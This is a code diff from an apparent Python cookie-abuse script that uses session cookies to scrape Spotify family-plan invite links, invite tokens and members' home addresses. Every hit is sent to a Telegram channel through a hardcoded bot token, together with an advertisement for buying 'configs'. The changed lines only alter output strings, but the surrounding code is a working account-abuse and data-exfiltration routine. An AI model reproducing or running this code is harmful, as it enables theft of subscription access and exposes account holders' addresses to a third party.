@@ -47,17 +47,17 @@ def get_cookies():
             slot = data.get('accessControl' , {}).get('planHasFreeSlots', '')
             inviteToken = data.get('inviteToken', '')
             invite_link = f"https://www.spotify.com/{country}/family/join/invite/{inviteToken}/"
-            result = f"ConCa Ip: {country} Link: {invite_link} Address: {address} MLHK"
+            result = f"MonLeoHayKhok"
             print(slot)
-            result2 = f"ConCa Khong Co Slot Ip: {country} Link: {invite_link} Address: {address} MLHK"
+            result2 = f"MonLeoHayKhok"
             if slot == True:
               bot_token = '5678937930:AAForYgL5zts5wawsdfmfgP_5-sraeugnp8'  
               bot = telebot.TeleBot(bot_token)
               chat_id = '-1002074013993' 
               mess = f'''SUCCESS SCRAPE SPOTIFY LINK✅
-  Plan: Spotify Premium {type}
-  Link: {invite_link}
-  Address: {address}
+Plan: Spotify Premium {type}
+Link: {invite_link}
+Address: {address}
   Country: {country}
   Buy Config inbox @monleohaykhok'''
               bot.send_message(chat_id, mess)
